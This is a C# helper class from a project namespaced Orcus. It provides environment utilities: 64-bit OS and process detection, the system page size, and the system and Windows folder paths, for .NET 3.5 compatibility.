using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Orcus.Native;

namespace Orcus.Extensions
{
    internal static class EnvironmentExtensions
    {
#if NET35
        private static bool? _is64BitOperatingSystem;
        private static bool? _is64BitProcess;
        private static int? _systemPageSize;

        public static bool Is64BitOperatingSystem
        {
            get
            {
                if (!_is64BitOperatingSystem.HasValue)
                {
                    _is64BitOperatingSystem = IntPtr.Size == 8 || (IntPtr.Size == 4 && Is32BitProcessOn64BitProcessor());
                }

                return _is64BitOperatingSystem.Value;
            }
        }

        public static bool Is64BitProcess
        {
            get
            {
                if (!_is64BitProcess.HasValue)
                {
                    _is64BitProcess = IntPtr.Size == 8;
                }

                return _is64BitProcess.Value;
            }
        }

        public static int SystemPageSize
        {
            get
            {
                if (!_systemPageSize.HasValue)
                {
                    var info = new SYSTEM_INFO();
                    NativeMethods.GetSystemInfo(ref info);
                    _systemPageSize = info.dwPageSize;
                }

                return _systemPageSize.Value;
            }
        }
#endif
        public static string SystemDirectory
        {
            get
            {
                var path = new StringBuilder(260);
                NativeMethods.SHGetSpecialFolderPath(IntPtr.Zero, path, 0x0029, false);
                return path.ToString();
            }
        }

        public static string WindowsFolder
            => Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.System)).FullName;

#if NET35
        private static IsWow64ProcessDelegate GetIsWow64ProcessDelegate()
        {
            IntPtr handle = NativeMethods.LoadLibrary("kernel32");

            if (handle != IntPtr.Zero)
            {
                IntPtr fnPtr = NativeMethods.GetProcAddress(handle, "IsWow64Process");

                if (fnPtr != IntPtr.Zero)
                {
                    return
                        (IsWow64ProcessDelegate)
                            Marshal.GetDelegateForFunctionPointer(fnPtr, typeof (IsWow64ProcessDelegate));
                }
            }

            return null;
        }

        private static bool Is32BitProcessOn64BitProcessor()
        {
            IsWow64ProcessDelegate fnDelegate = GetIsWow64ProcessDelegate();

            if (fnDelegate == null)
            {
                return false;
            }

            bool isWow64;
            bool retVal = fnDelegate.Invoke(Process.GetCurrentProcess().Handle, out isWow64);

            if (retVal == false)
            {
                return false;
            }

            return isWow64;
        }

        private delegate bool IsWow64ProcessDelegate([In] IntPtr handle, [Out] out bool isWow64Process);
#endif
    }
}